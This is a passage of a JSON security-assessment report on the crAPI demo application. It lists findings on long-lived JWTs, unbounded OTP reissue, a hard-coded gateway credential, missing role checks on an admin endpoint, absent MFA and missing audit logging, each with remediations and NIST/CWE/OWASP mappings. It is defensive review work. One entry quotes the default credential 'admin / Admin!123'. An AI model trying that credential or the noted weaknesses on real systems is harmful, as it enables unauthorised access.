        ],
        "attack": [],
        "cwe": [
          "CWE-798",
          "CWE-321"
        ],
        "owasp_api": [
          "API8:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "ephem-96d3befb",
      "title": "7-day JWT TTL with no refresh-token rotation, no idle timeout, no logout",
      "goal": "ephemeral",
      "tier": "scalability",
      "severity": "high",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Per tech_plan §4: 7-day bearer; no /logout endpoint; no idle-timeout, no credential-change-revokes-sessions semantics.",
      "detail": "Per tech_plan §4 and the OpenAPI absence of a /logout endpoint,\na crAPI session lives for 7 days with no idle-timeout boundary,\nno logout revocation, no behavior-on-credential-change semantics.\nThe 7-day TTL is the entire session.\n\nPer the rubric clause \"JWT access-token lifetime exceeds 1 hour\nwith no refresh-token rotation and no revocation channel\" —\nseverity is high. Combined with the JWT forgery vectors\n(intg-15c04a1c) and the inability to revoke (resil-776fc650),\nthis is the structural session-lifetime gap.\n\nThis finding is the Ephemeral framing (the credential is too\nlong-lived). The session-revocation framing is in Resilient\n(resil-776fc650) and the authentication-strength framing is in\nAuthenticity (auth-jwt-validation).\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§4 Authentication and sessions",
          "excerpt": "There is no MFA. There is no documented session-revocation surface (no /logout endpoint)"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "JWT TTL 1h; refresh-token rotation; /logout with JTI deny-list; idle timeout 30m."
      },
      "mappings": {
        "nist": [
          "IA-5",
          "IA-5(13)",
          "AC-12",
          "AC-12(1)",
          "SC-10"
        ],
        "attack": [],
        "cwe": [
          "CWE-613",
          "CWE-384"
        ],
        "owasp_api": [
          "API2:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "ephem-6020f861",
      "title": "OTP TTL implied ~10 minutes but not asserted; re-issuance unbounded",
      "goal": "ephemeral",
      "tier": "scalability",
      "severity": "medium",
      "confidence": "high",
      "disposition": "blocked",
      "summary": "Challenge 3 implies TTL; ADR-0003 explicit on no throttling discipline.",
      "detail": "The intake-brief evidence-gap entry on OTP TTL is operative\nhere. Challenge 3's discussion implies a ~10 minute TTL but the\ninput set does not assert it. ADR-0003 explicitly states \"No\nreplay or throttling discipline on OTP issuance\" — re-issuance\nis unbounded (avail-c1ffcf8e covers the rate-limit gap).\n\nThe Ephemeral concern: the OTP credential lifetime is uncertain\nand re-issuance creates a sliding window where multiple\nlegitimate OTPs may be valid simultaneously. Severity is medium\nbecause the 4-digit OTP space (avail-e96ad7ff) makes brute\nforce the dominant concern over TTL precision.\n\nDisposition is `blocked` pending the actual OTP TTL config from\nidentity-service source review.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§7 OTP delivery",
          "excerpt": "TTL: per challenge 3 solution discussion, the OTP expiry is short (~10 minutes) but the per-OTP attempt count on the v3 variant is unbounded"
        }
      ],
      "recommendation": {
        "posture": "recommended",
        "summary": "Pin OTP TTL to 5 minutes; invalidate prior OTP on re-issuance."
      },
      "mappings": {
        "nist": [
          "IA-5",
          "IA-5(13)",
          "AC-12"
        ],
        "attack": [],
        "cwe": [
          "CWE-613"
        ],
        "owasp_api": [
          "API2:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": [
        "Identity OTP-handler TTL config value",
        "OTP re-issuance behavior (invalidates prior?)"
      ]
    },
    {
      "id": "ephem-a39a1f7b",
      "title": "Gateway-service basic-auth credential undocumented and unrotated",
      "goal": "ephemeral",
      "tier": "scalability",
      "severity": "medium",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Per S-5 hard-coded in identity binary; rotation requires rebuild and redeploy.",
      "detail": "Per S-5 in the threat model, the gateway-service authentication\nis HTTP basic-auth. The credential location is not documented;\nthe threat-model entry speculates \"presumably hard-coded in the\nidentity service binary\".\n\nA credential hard-coded in a binary is the worst Ephemeral\npattern: rotation requires a new build and redeploy, the\ncredential is observable to anyone with the binary, and there is\nno audit signal on use. The credential is also reachable via the\nchatbot (which holds Admin!123, and per S-5 \"if guessable\nagainst admin / Admin!123 — visible in the chatbot env\" — the\nsame trivial pattern may be reused).\n\nSeverity is medium per the rubric's basic-auth-rotation pattern;\nescalates to high if the credential is genuinely `admin / Admin!123`\nas S-5 hypothesizes.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "threat-model.md",
          "locator": "§1 S-5",
          "excerpt": "if static and obtainable (env dump, log leak, or simple guess against admin / Admin!123 — visible in the chatbot env)"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Externalize gateway basic-auth credential to env or vault; document rotation."
      },
      "mappings": {
        "nist": [
          "IA-5",
          "IA-5(1)",
          "IA-5(7)",
          "SC-12"
        ],
        "attack": [],
        "cwe": [
          "CWE-798"
        ],
        "owasp_api": [
          "API2:2023",
          "API8:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "ephem-edcc17b4",
      "title": "ChromaDB pinned to :latest — image content can change without pull event",
      "goal": "ephemeral",
      "tier": "scalability",
      "severity": "medium",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Mutable image tag introduces deploy-time version drift.",
      "detail": "Per tech_plan §2 and architecture-index `§chromadb`, the\nChromaDB image is `chromadb/chroma:latest`. The `:latest` tag is\nthe canonical mutable-in-production anti-pattern: the published\nimage at `:latest` can change at any time, and Docker's\n`imagePullPolicy: IfNotPresent` (the default) means a node may\nrun an older `:latest` than another node, producing version skew.\n\nThe Ephemeral concern is twofold: (a) the running image content\nis non-deterministic — a deploy on Monday differs from a deploy\non Friday with no Git commit between them; (b) there is no\nattribution chain from the artifact-signing perspective (covered\nin authn-image-signing).\n\nSeverity is medium per the rubric's \"Container images mutable in\nproduction — `:latest` tags\" pattern. Postgres and Mongo are\npinned (`postgres:14`, `mongo:4.4`) which is the floor; the\nChromaDB exception is the operative finding.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§2 Services table",
          "excerpt": "chromadb — chromadb (chromadb/chroma:latest)"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Pin ChromaDB to specific version + digest; apply digest-pinning to all images."
      },
      "mappings": {
        "nist": [
          "CM-2",
          "CM-3",
          "SA-15(7)",
          "SI-7",
          "SR-4"
        ],
        "attack": [],
        "cwe": [
          "CWE-1357"
        ],
        "owasp_api": [
          "API8:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "ephem-2c1c7ecf",
      "title": "Just-in-time human access not modeled; operator uses shared admin against datastores",
      "goal": "ephemeral",
      "tier": "scalability",
      "severity": "medium",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Runbook §9 instructs docker compose exec into postgresdb as admin; no time-boxed, audited, or approval-gated access.",
      "detail": "Per runbook §9 (\"Respond to a balance went wrong report\"), the\ndocumented operator action is `docker compose exec postgresdb\npsql -U admin -d crapi`. Every operator with shell access to the\nhost has the admin credential and unbounded access to the\ndatastore.\n\nThe Ephemeral pattern here is \"JIT human access for production\nvia approval workflow with time-boxed grants and full session\nrecording\" — crAPI's posture is the opposite: persistent shell\naccess, no approval, no time-bound, no session recording. For\nthe demo intent (single operator on a laptop) this is\nacceptable; for any shared deploy it is a Ephemeral gap.\n\nSeverity is medium because the demo-intent makes this tolerable;\nfor any non-demo deploy it is the canonical privilege-elevation\npattern.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "runbook.md",
          "locator": "§9 Respond to balance went wrong",
          "excerpt": "docker compose exec postgresdb psql -U admin -d crapi"
        }
      ],
      "recommendation": {
        "posture": "consider",
        "summary": "For shared deploys, per-operator credentials via vault dynamic secrets + bastion."
      },
      "mappings": {
        "nist": [
          "AC-2",
          "AC-2(2)",
          "AC-2(3)",
          "AC-6",
          "AC-6(9)",
          "AU-12"
        ],
        "attack": [],
        "cwe": [
          "CWE-269"
        ],
        "owasp_api": [
          "API8:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "ephem-3ad94819",
      "title": "Per-session chatbot LLM provider key bootstrap has no session-end revocation documented",
      "goal": "ephemeral",
      "tier": "scalability",
      "severity": "medium",
      "confidence": "high",
      "disposition": "gap",
      "summary": "POST /chatbot/genai/init accepts per-session OpenAI/Anthropic key; storage location and lifetime unspecified.",
      "detail": "Per tech_plan §3 boundary #6, the chatbot accepts per-session\nLLM-provider keys via `POST /genai/init` for OpenAI and Anthropic.\nThe input set does not document: (a) where the per-session key\nis stored (in-memory? written to disk? logged?); (b) when the\nsession ends and the key is revoked; (c) whether the same key\ncan be reused across sessions.\n\nThe Ephemeral concern is the session-key lifetime. If the key\nlives in memory only for the chatbot's session, the pattern is\nreasonable. If the key is persisted, even briefly, the\nattack surface grows substantially — a separate credential\ncompromise (e.g., chatbot container env dump) discloses\ncaller-supplied LLM keys for every active session.\n\nSeverity is medium pending session-key handling confirmation;\nthe in-memory-only pattern is acceptable, the persisted pattern\nis high.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§8 Chatbot endpoints",
          "excerpt": "POST /genai/init <-- per-session LLM provider key bootstrap (OpenAI/Anthropic only)"
        }
      ],
      "recommendation": {
        "posture": "recommended",
        "summary": "Document per-session key handling: in-memory only, scrubbed on session end, never logged."
      },
      "mappings": {
        "nist": [
          "IA-5",
          "IA-5(1)",
          "AC-12",
          "SC-28"
        ],
        "attack": [],
        "cwe": [
          "CWE-256",
          "CWE-613"
        ],
        "owasp_api": [
          "API2:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "auth-4ef8b512",
      "title": "BFLA — admin video-delete reachable by non-admin tokens",
      "goal": "authenticity",
      "tier": "auditability",
      "severity": "high",
      "confidence": "high",
      "disposition": "gap",
      "summary": "DELETE /identity/api/v2/admin/videos/{id} accepts any user token; role claim not checked.",
      "detail": "Per challenge 7 / E-1, the admin-prefixed endpoint accepts non-admin\ntokens — the role claim is never checked. The Authenticity framing:\nthe identity assertion is verified (the token signature checks out\nper the alg-confusion gaps aside) but the *role* claim within the\nverified identity is not enforced. The authorization side of\nauthentication fails.\n\nThe threat-model E-1 entry notes the pattern generalizes:\n`/workshop/api/shop/orders/all` and `/workshop/api/management/users/all`\nare also admin-shaped per naming, and their auth posture is not\nstated in inputs.\n\nSeverity is high per \"BFLA exposing admin functions to authenticated\nlow-privilege users\" in the API security rubric. The clause\nenumerates \"missing role check on a privilege-altering operation\"\nas the canonical case.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§9 BFLA #7",
          "excerpt": "The admin path DELETE /identity/api/v2/admin/videos/{video_id} does not check the caller's role"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Add role check on /admin/* prefix; audit /shop/orders/all, /management/users/all for same pattern."
      },
      "mappings": {
        "nist": [
          "IA-2",
          "AC-3",
          "AC-6",
          "AC-6(1)",
          "AC-6(7)"
        ],
        "attack": [
          "T1078"
        ],
        "cwe": [
          "CWE-285",
          "CWE-269",
          "CWE-862"
        ],
        "owasp_api": [
          "API5:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "auth-0925a719",
      "title": "No MFA on any authentication surface — including admin",
      "goal": "authenticity",
      "tier": "auditability",
      "severity": "critical",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Per tech_plan §4: 'There is no MFA' on any surface, including admin actions.",
      "detail": "Per tech_plan §4 explicitly: \"There is no MFA.\" Every\nauthentication surface — signup, login, password reset, admin\nactions — relies on a single factor (password or password-reset\nOTP). Admin video-delete (BFLA notwithstanding), admin order\nenumeration, and admin user enumeration all execute against the\nsame single-factor token.\n\nThe rubric clause \"MFA optional on administrative surfaces (OWASP\nAPI2)\" rates this critical when on PII or payment admin. crAPI's\nadmin surfaces touch user-record enumeration and video deletion;\nthe broader gateway-service path reaches faker-seeded PII / payment\ndata. Severity is critical per the rubric for the PII-admin\nframing.\n\nFor the demo intent the absence of MFA is expected and acceptable;\nthis finding is the structural finding against the architecture,\nnot a procedural complaint against the operator.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§4 Authentication and sessions",
          "excerpt": "There is no MFA"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Add TOTP MFA on login (optional user, required admin); WebAuthn for admin step-up."
      },
      "mappings": {
        "nist": [
          "IA-2",
          "IA-2(1)",
          "IA-2(2)",
          "IA-2(6)",
          "IA-2(8)",
          "AC-6"
        ],
        "attack": [
          "T1078"
        ],
        "cwe": [
          "CWE-308"
        ],
        "owasp_api": [
          "API2:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": [],
      "headline": true,
      "headline_rank": 2
    },
    {
      "id": "auth-b57f022f",
      "title": "OTP-based password reset is single-factor account-recovery",
      "goal": "authenticity",
      "tier": "auditability",
      "severity": "high",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Forget-password initiates reset via email-only claim; OTP success completes recovery with no additional verification.",
      "detail": "Per tech_plan §4 and the threat-model S-6 entry, the password-\nreset flow accepts the email as the sole identity claim. The OTP\nverification (which is itself weak per avail-e96ad7ff) is the\nonly barrier between request and password change.\n\nAuthentication-quality on account-recovery is a sharper concern\nthan authentication-quality on login: the recovery flow exists\nspecifically to grant access to accounts whose primary\ncredential is unknown to the user. Without a second factor or\nknowledge-of-prior-password requirement, any party who can read\nthe OTP (mailhog at :8025, attacker who can brute force, S-6\nenumeration combined with OTP weakness) gets the account.\n\nSeverity is high per \"MFA bypass or weak MFA on PII or payment\nsurfaces\" — the forget-password path is the MFA-bypass\nequivalent when MFA is absent (auth-0925a719). The rubric\nspecifically calls out recovery-code endpoints without rate\nlimiting; this is the OTP-flow equivalent.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§4 Authentication endpoints",
          "excerpt": "POST /identity/api/auth/forget-password — OTP email dispatch"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Require knowledge of prior password OR MFA factor for password reset; rate-limit forget-password."
      },
      "mappings": {
        "nist": [
          "IA-5",
          "IA-5(1)",
          "IA-2",
          "IA-2(8)",
          "AC-7"
        ],
        "attack": [],
        "cwe": [
          "CWE-640",
          "CWE-308"
        ],
        "owasp_api": [
          "API2:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "auth-5b90d6c3",
      "title": "Service-to-service authentication via bearer JWT only, not mTLS or workload identity",
      "goal": "authenticity",
      "tier": "auditability",
      "severity": "high",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Plaintext HTTP in-cluster with header-trust; no mTLS, no SPIFFE.",
      "detail": "In-cluster service-to-service traffic uses bearer JWTs for\nauthentication and plaintext HTTP for transport. There is no\nmTLS, no SPIFFE/SPIRE workload identity, no service-mesh\nidentity binding. The web tier presents `Host` and\n`X-Forwarded-*` headers that backend services trust (per\ntech_plan §3 boundary #2).\n\nPer the rubric clause \"Service-to-service inside the cluster\nuses shared bearer tokens, not mTLS or workload identity\" —\nseverity is high. The lateral-movement amplification is concrete:\nan attacker who reaches one service-internal pod (e.g., via\nSSRF in workshop reaching identity directly) can forge whatever\nheaders the next service trusts.\n\nFor the demo intent on a single host this is acceptable. For\nany deploy with multiple network zones or untrusted in-cluster\ntraffic, the absence of mTLS is the structural identity gap.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§3 boundary #2",
          "excerpt": "Plain HTTP inside the Compose network unless TLS_ENABLED=true. No mutual TLS"
        }
      ],
      "recommendation": {
        "posture": "recommended",
        "summary": "For non-demo deploys, enable mTLS via service mesh (Linkerd/Istio) with SPIFFE workload identity."
      },
      "mappings": {
        "nist": [
          "SC-8",
          "SC-8(1)",
          "SC-23",
          "IA-3",
          "IA-9"
        ],
        "attack": [
          "T1557"
        ],
        "cwe": [
          "CWE-319",
          "CWE-345"
        ],
        "owasp_api": [
          "API8:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "auth-04fcfb9a",
      "title": "Container images not signed; no admission control verifies image authenticity",
      "goal": "authenticity",
      "tier": "auditability",
      "severity": "medium",
      "confidence": "medium",
      "disposition": "gap",
      "summary": "No cosign/notation signature posture, no admission control; image-pull trust relies on registry.",
      "detail": "Per the rubric's \"Container images deployed without signature\nverification or admission control\" pattern, the absence of any\nimage-signing posture is a supply-chain authenticity gap. crAPI\npulls upstream images (postgres, mongo, chromadb, mailhog) and\ncrAPI's own (crapi/crapi-identity, etc.) with no signature\nverification step documented.\n\nThe Authenticity concern: when a deploy pulls `crapi/crapi-identity:\n${VERSION}`, there is no cryptographic proof that the image content\nmatches what the crAPI maintainers published. Registry compromise\nor DNS poisoning yields silent image substitution.\n\nSeverity is medium per the rubric's image-signing pattern. For the\ndemo intent (single operator pulling from public registries) the\nimpact is bounded by registry trust. For any deploy that trusts\ncrAPI as a teaching target rather than as a malware-delivery\nsurface, this would be material.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§2 Services",
          "excerpt": "crapi/crapi-identity:${VERSION}"
        }
      ],
      "recommendation": {
        "posture": "recommended",
        "summary": "Upstream: sign crAPI images via cosign; publish verification key; document operator verification."
      },
      "mappings": {
        "nist": [
          "SI-7",
          "SR-4",
          "SR-4(3)",
          "SR-4(4)",
          "SR-11",
          "CM-5"
        ],
        "attack": [],
        "cwe": [
          "CWE-345"
        ],
        "owasp_api": [
          "API8:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "auth-c990b0ff",
      "title": "AAL target undeclared (NIST SP 800-63B AAL1/AAL2/AAL3 not stated)",
      "goal": "authenticity",
      "tier": "auditability",
      "severity": "medium",
      "confidence": "medium",
      "disposition": "blocked",
      "summary": "No Authenticator Assurance Level target; cannot evaluate MFA-strength against defined standard.",
      "detail": "Per the rubric's \"AAL undeclared\" pattern, the absence of an\nAuthenticator Assurance Level target means the gauntlet cannot\nevaluate authentication strength against a defined standard.\n\ncrAPI's authentication posture (single-factor password, OTP\naccount recovery, no MFA) implicitly targets AAL1 — but AAL1 is\nNIST's lowest tier and is generally inappropriate for any system\nhandling PII at scale.\n\nDisposition is `blocked` rather than `gap` because the\nremediation is to declare a target, and the target choice\ndepends on the deploy intent (per agents.md the demo intent\nmakes AAL1 acceptable; for any other intent AAL2 minimum).\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§4 Authentication and sessions",
          "excerpt": "There is no MFA. There is no documented session-revocation surface"
        }
      ],
      "recommendation": {
        "posture": "recommended",
        "summary": "Add AAL target to tech_plan §4; couple with MFA introduction."
      },
      "mappings": {
        "nist": [
          "IA-2",
          "IA-2(1)",
          "IA-2(2)",
          "IA-2(8)"
        ],
        "attack": [],
        "cwe": [
          "CWE-308"
        ],
        "owasp_api": [
          "API2:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": [
        "AAL target declaration per deploy intent",
        "Per-surface AAL declaration"
      ]
    },
    {
      "id": "nonrep-7fad26d8",
      "title": "No application-level audit log for consequential actions across any service",
      "goal": "non_repudiation",
      "tier": "auditability",
      "severity": "high",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Per runbook §8: GAP. No audit log; only LOG_LEVEL=INFO stdout. No actor attribution, no schema, no retention.",
      "detail": "Per runbook §8 (\"Inspect audit data\") explicitly: \"GAP. No\napplication-level audit log is shipped. Containers emit to\nstdout at LOG_LEVEL=INFO; aggregation is operator-provided.\"\nPer the threat-model R-1 entry, there is no immutable record of\nwho initiated financial actions, password resets, vehicle\nadditions, mechanic-report submissions, or any other consequential\naction enumerated in the active domain pack's consequential-\nactions list.\n\nThe Non-Repudiation lens evaluates audit coverage against the\ndomain pack's consequential-actions list. The list includes\nauthentication events, authorization decisions, PII access,\npayment events, session lifecycle, OAuth/OIDC events,\nadministrative configuration, third-party integration,\nbreak-glass, and data-subject rights events — every single\ncategory is uncovered in crAPI.\n\nSeverity is high per \"Partial audit gap on consequential-action\nflows\" — except this is total absence, not partial gap. The\nrubric escalates \"Audit trail loss covering credential or\npayment events\" to critical; given crAPI's payment surface\n(gateway-service, credit/orders) and credential surface\n(login, OTP, password-reset), the critical-tier rubric clause\nalso applies. Holding at high because the demo-intent context\nbounds the production impact, but for any production-adjacent\ndeploy this would be critical.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "runbook.md",
          "locator": "§8 Inspect audit data",
          "excerpt": "GAP. No application-level audit log is shipped"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Define audit schema; emit per consequential action with actor attribution; ship to separate sink."
      },
      "mappings": {
        "nist": [
          "AU-2",
          "AU-3",
          "AU-3(1)",
          "AU-3(3)",
          "AU-6",
          "AU-12",
          "AU-12(1)"
        ],
        "attack": [
          "T1562"
        ],
        "cwe": [
          "CWE-778",
          "CWE-223"
        ],
        "owasp_api": [
          "API9:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": [],
      "headline": true,
      "headline_rank": 9
    },
    {
      "id": "nonrep-fa2c351c",
      "title": "OTP issuance and verification not audit-logged at application layer",
      "goal": "non_repudiation",
      "tier": "auditability",
      "severity": "high",
      "confidence": "high",
      "disposition": "gap",
      "summary": "ADR-0003 explicit: identity does not audit-log dispatch; mailhog records SMTP envelope only.",
      "detail": "Per ADR-0003 Consequences: \"OTP delivery is unattributed at the\napplication layer. Mailhog records the SMTP envelope but the\nidentity service does not audit-log the dispatch event.\"\n\nThe Non-Repudiation gap is acute on the OTP path because OTP\nissuance + verification is the account-recovery surface and is\nthe recovery-attempt evidence horizon. Without audit, the\noperator cannot reconstruct: who initiated a reset, when, from\nwhat IP, with what user-agent, whether the OTP was successfully\nverified or merely brute-forced (avail-e96ad7ff), whether the\nreset completed.\n\nRunbook §10 (\"Respond to user account takeover\") tries to\nreconstruct via the Mailhog inbox, but Mailhog stores the\nenvelope only (not the requester IP) and the in-memory ring\nbuffer evicts on restart (dist-c5b2799b).\n\nSeverity is high per \"Audit retention shorter than the longest\nplausible breach-detection window\" combined with the OTP-specific\nconsequential-action coverage gap.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "adrs/0003-mailhog-for-otp-delivery.md",
          "locator": "Consequences",
          "excerpt": "OTP delivery is unattributed at the application layer"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Audit-log OTP issuance and verification per nonrep-7fad26d8 schema with source IP / user-agent."
      },
      "mappings": {
        "nist": [
          "AU-2",
          "AU-3",
          "AU-12",
          "AU-10"
        ],
        "attack": [],
        "cwe": [
          "CWE-778"
        ],
        "owasp_api": [
          "API9:2023",
          "API2:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "nonrep-304b32af",
      "title": "No source IP / user-agent attribution on any consequential action",
      "goal": "non_repudiation",
      "tier": "auditability",
      "severity": "high",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Runbook §10: no source IP/UA in audit trail; per-request actor context missing.",
      "detail": "Beyond the absence of any audit log (nonrep-7fad26d8), the\nrunbook §10 entry highlights that even an introduced audit\npipeline would need to capture per-request context that crAPI\ndoes not currently propagate to the application layer: source\nIP, user-agent, request-id, correlation-id.\n\nIn particular, the web ingress passes traffic to backend\nservices with `X-Forwarded-*` headers (per tech_plan §3 boundary\n#2) but the backend services' trust-or-extract posture for these\nheaders is not specified. If the backend services do extract\nX-Forwarded-For for the would-be audit, they need to either\ntrust OpenResty's setting (vulnerable to upstream header\ninjection if a client supplies X-Forwarded-For pre-ingress) or\nextract from OpenResty's last hop only.\n\nSeverity is high per the same Non-Repudiation rubric pattern:\n\"actor field is system or a shared service account\" — here the\nactor record is missing entirely, which is structurally worse.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "runbook.md",
          "locator": "§10 Respond to user account takeover",
          "excerpt": "There is no source IP / user-agent in the audit trail"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Propagate source IP, user-agent, request-id from OpenResty into backend services; include in every audit event."
      },
      "mappings": {
        "nist": [
          "AU-3",
          "AU-3(1)",
          "AU-3(3)"
        ],
        "attack": [],
        "cwe": [
          "CWE-778"
        ],
        "owasp_api": [
          "API9:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "nonrep-9faa010e",
      "title": "Audit shipping reliability — no documented shipper, retention, or buffering posture",
      "goal": "non_repudiation",
      "tier": "auditability",
      "severity": "medium",
      "confidence": "high",
      "disposition": "blocked",
      "summary": "Runbook §8 punts log-shipper/retention/schema/tamper-evidence to operator.",
      "detail": "Per runbook §8, the gaps in the audit pipeline are: log shipper\n(Fluent Bit, Filebeat) collecting per-container stdout;\nretention policy; schema for audit events; tamper-evidence on\nstored logs. All four are operator-provided, none documented.\n\nThe Non-Repudiation concern at the shipping layer is that even\nwith an introduced audit-emit per nonrep-7fad26d8, if shipping\nis fire-and-forget (no buffering, no acknowledgment) the\nconsumer-side failure produces silent loss. Per the rubric's\n\"Audit shipping is fire-and-forget; consumer-side failure\nproduces silent loss\" pattern this is high severity.\n\nDisposition is `blocked` because the operator's chosen shipping\nstack determines the appropriate buffering, retry, and dead-\nletter posture. Severity is medium because the deeper\naudit-absence concern (nonrep-7fad26d8) renders this concern\nmoot until the underlying gap is closed.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "runbook.md",
          "locator": "§8 Inspect audit data",
          "excerpt": "A log shipper (Fluent Bit, Filebeat) collecting per-container stdout. A retention policy. A schema. Tamper-evidence"
        }
      ],
      "recommendation": {
        "posture": "recommended",
        "summary": "When nonrep-7fad26d8 is addressed, ship via buffered, retry-aware shipper with documented dead-letter."
      },
      "mappings": {
        "nist": [
          "AU-4",
          "AU-5",
          "AU-5(1)",
          "AU-5(2)"
        ],
        "attack": [],
        "cwe": [
          "CWE-778"
        ],
        "owasp_api": [
          "API9:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": [
        "Operator-chosen log shipper and aggregator",
        "Retention policy",
        "Shipping reliability posture"
      ]
    },
    {
      "id": "nonrep-c32e3967",
      "title": "Time-source policy unspecified — audit timestamps will be local clocks without drift bounds",
      "goal": "non_repudiation",
      "tier": "auditability",
      "severity": "medium",
      "confidence": "high",
      "disposition": "blocked",
      "summary": "No NTP policy, no drift bounds; per-container clock drift defeats forensic ordering.",
      "detail": "Per the rubric's \"No time-source policy\" pattern, the input set\nis silent on NTP discipline. In multi-container deployments\n(compose, k8s), per-container clocks may drift independently;\nthe host clock may not be NTP-synced; audit timestamps from\ndifferent services may not be totally-ordered.\n\nFor the demo intent (single-host, short-lived runs) this is\nacceptable. For any deploy where audit is intended for forensic\nreconstruction, drift between identity, workshop, and community\ntimestamps produces a reconstruction gap.\n\nDisposition is `blocked` because the time-source posture is\nhost/deploy-level concern (Docker uses the host clock by\ndefault) and the appropriate remediation depends on substrate.\nSeverity is medium pending the deeper audit-absence resolution\n(nonrep-7fad26d8).\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "runbook.md",
          "locator": "§8",
          "excerpt": "Tamper-evidence on stored logs (currently none)"
        }
      ],
      "recommendation": {
        "posture": "consider",
        "summary": "Document NTP posture: chrony on host; drift bound <1s for audit consistency."
      },
      "mappings": {
        "nist": [
          "AU-8",
          "AU-8(1)"
        ],
        "attack": [],
        "cwe": [
          "CWE-829"
        ],
        "owasp_api": [
          "API9:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": [
        "Host time-source posture",
        "Per-container clock-source declaration"
      ]
    },
    {
      "id": "nonrep-b9ba65ab",
      "title": "No audit-of-audit-access; audit access controls undefined because audit does not exist",
      "goal": "non_repudiation",
      "tier": "auditability",
      "severity": "medium",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Rubric requires separate-role audit access and audit-of-audit-access; both contingent on audit existing.",
      "detail": "Per the rubric's \"Audit-read access uncontrolled\" pattern, audit\naccess should be gated by a separate role and itself audited\n(audit-of-audit-access). For crAPI this is structurally moot\nbecause no audit log exists (nonrep-7fad26d8), but the finding\nis worth recording so the audit-introduction in\nnonrep-7fad26d8 carries the access-control expectation forward.\n\nSeverity is medium because the concern is contingent on the\nunderlying audit-absence remediation. When audit is added,\naccess controls and audit-of-audit emission must be designed\nin from the start, not retrofitted.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "runbook.md",
          "locator": "§8",
          "excerpt": "What an operator would need: A log shipper. A retention policy. A schema. Tamper-evidence on stored logs"
        }
      ],
      "recommendation": {
        "posture": "recommended",
        "summary": "Design audit-introduction with separate-role audit access and audit-of-audit-access emission."
      },
      "mappings": {
        "nist": [
          "AU-9",
          "AU-9(4)",
          "AU-9(6)",
          "AC-5",
          "AC-6"
        ],
        "attack": [],
        "cwe": [
